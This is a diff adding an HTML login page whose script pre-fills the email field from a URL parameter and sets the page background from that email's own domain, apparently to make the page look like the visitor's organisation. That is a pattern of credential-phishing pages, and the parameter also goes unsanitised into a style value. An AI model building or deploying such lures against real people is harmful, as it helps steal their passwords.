@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-size: cover;
+            background-repeat: no-repeat;
+        }
+        .login-container {
+            background: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .login-container h2 {
+            margin-bottom: 20px;
+        }
+        .login-container label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007BFF;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Login</h2>
+        <form>
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" required>
+            
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+            
+            <button type="submit">Login</button>
+        </form>
+    </div>
+
+    <script>
+        // Function to extract email from URL parameters
+        function getEmailFromURL() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get('email');
+        }
+
+        // Function to set background based on email domain
+        function setBackgroundBasedOnEmailDomain(email) {
+            if (email) {
+                const domain = email.split('@')[1];
+                const backgroundUrl = `https://${domain}`;
+
+                document.body.style.backgroundImage = `url('${backgroundUrl}')`;
+                document.getElementById('email').value = email;
+            }
+        }
+
+        // On page load, grab the email from URL and set the background
+        window.onload = function() {
+            const email = getEmailFromURL();
+            setBackgroundBasedOnEmailDomain(email);
+        }
+    </script>
+</body>
+</html>
